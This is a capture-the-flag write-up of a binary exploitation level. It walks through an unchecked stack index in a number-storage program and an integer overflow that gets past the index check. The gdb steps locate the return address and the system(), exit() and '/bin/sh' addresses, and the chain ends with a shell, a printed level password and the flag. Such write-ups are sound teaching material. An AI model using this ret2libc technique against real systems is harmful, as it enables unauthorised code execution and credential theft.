
# Welcome to wil's crappy number storage service !

## Program summary
On this level we are provided with a program which has the function of saving passwords at a given index in the stack. As usual we will focus on vulnerabilities.

Input restrictions :

- Valid command
- The index must have a rest after a **% 3**.
- The **number >> 0x18 == 0xb7**, should not satisfy this condition.

The **`store_number()`** function is called with the buffer addr as argument which contains all the numbers saved by storage. Below I show you several small sections in the assembly code, the index input is saved at **`$ebp-0xc`** and then an assignment takes place with the number.

```
08048630 <store_number>:
...
8048666:	e8 7c ff ff ff       	call   80485e7 <get_unum>
804866b:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
...
80486c2:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
80486c5:    c1 e0 02           		shl    eax,0x2
80486c8:	03 45 08             	add    eax,DWORD PTR [ebp+0x8]
80486cb:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]
80486ce:	89 10                	mov    DWORD PTR [eax],edx
```

## Vulnerability

The index input allows to write on a very wide range of the stack without verification upstream, it's an excellent source of vulnerability, if we manage to point it in the right place. 

## Attack design

1. Get Offset

Now we need to find the exact OFFSET to inject our malicious code, that is to say the address of the environment variable that we will create with shellcode. What we will do in order to get the OFFSET is to locate the ret addr of main and calculate the distance from the start of the buffer which serves as a number storage manager.
```
(gdb) b store_number
Breakpoint 1 at 0x8048636
(gdb) backtrace
#0  0x08048636 in store_number ()
#1  0x080488ef in main ()
(gdb) info frame 1
Stack frame at 0xffffd620:
 eip = 0x80488ef in main; saved eip 0xf7e45513
 caller of frame at 0xffffd430
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610, edi at 0xffffd614, eip at 0xffffd61c
(gdb) x $ebp+0x08
0xffffd430:	0xffffd454
```
As explained recently I read on **`$ebp-0x08`** since the addr of the buffer number storage manager resides there.

Buffer that holds numbers 0xffffd454 = 4294956116
EIP location in main stack frame 0xffffd61c = 4294956572

`4294956572 - 4294956116 = 456`

OFFSET will be **456**

`456 >> 2 = 114 or 456 / 4 = 114`

However 114 is not accepted as input since: **114 % 3 = 0**.

But this is not really a problem because in itself, our input is modified after the preflight check, which means that we can play with an overflow. Let's enter the right value so that it overflows with an SHL of 2 to fall back to the initial value 114.
```c
if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7))
{
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    uVar3 = 1;
}
else
{
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
    uVar3 = 0;
}
```

Overflow exploit :

```
unsigned int overflowVal = (std::pow(2, 32) / 4) + 114; -> 1073741938
4 * overflowVal = 456
```


3. Retrieve the **`system()`** address :
```c
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

4. Retrieve **`exit()`** address :
```c
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

5. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
```
(gdb) info proc map
process 1857
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Now we are going to store these 3 addresses necessary for the execution of our attack with this faulty storage system.

```
store
...
number 4159090384
index 1073741938
...
number 4159040368
index 115
...
number 4160264172
index 116
```

```
$ cat /home/users/level08/.pass            
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

> Flag : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC